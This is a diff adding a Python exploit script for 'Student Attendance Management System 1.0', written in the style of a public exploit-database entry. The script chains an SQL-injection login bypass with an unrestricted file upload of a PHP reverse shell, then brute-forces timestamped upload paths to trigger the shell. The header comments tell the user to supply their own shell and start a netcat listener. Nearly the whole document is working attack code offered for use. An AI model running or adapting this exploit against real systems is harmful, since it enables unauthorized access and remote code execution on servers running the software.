@@ -1,0 +1,53 @@
+# Exploit Title: Student Attendance Management System 1.0 - 'username' SQL Injection / Remote Code Execution
+# Date: 4-11-2020
+# Exploit Author: mosaaed
+# Vendor Homepage: https://www.sourcecodester.com/php/14561/student-attendance-management-system-using-phpmysqli-source-code.html
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/student-attendance-management-system.zip
+# Version: 1.0
+# Tested on: Parrot 5.5.17 + Apache 2.4.46
+
+# replace shell.php with your own php reverse shell
+# change [TARGET URL] to target URL or IP address
+# setup your netcat listener for sum good ol shellz
+
+
+
+#!/usr/bin/python3
+
+import requests
+import time
+
+def sqli_admin():
+        s = requests.Session()
+        data = {"username":"admin'or'1'=1#","password":"mosaaed"}
+        adminlogin = "http://localhost/sta/ajax.php?action=save_settings"
+        s.post(adminlogin,data=data)
+        return s
+
+def trigger_rce(session):
+        starttime = int(time.time())
+        multipart_form_data = {
+        "name": ("cyberscurity"),
+        "email": ("test@test.com"),
+        "contact" : ("+11111111111"),
+        "about" : ("attack"),
+        "img" : ("shell.php", open("shell.php", "rb"))
+        }
+        session.post("http://localhost/sta/ajax.php?action=save_settings", files=multipart_form_data)
+        get_shell(starttime-100,starttime+100,session)
+
+
+def get_shell(start,end,session):
+        for i in range(start,end):
+                 session.get("http://localhost/sta/assets/uploads/"+str(i)+"_shell.php")
+                 response = requests.get ("http://localhost/sta/assets/uploads/"+ str(i) +"_shell.php")
+                 if response.status_code == 200:
+                            print("http://localhost/sta/assets/uploads/"+str(i)+"_shell.php")
+                        
+
+def main():
+        session = sqli_admin()
+        trigger_rce(session)
+
+if __name__ == '__main__':
+        main()
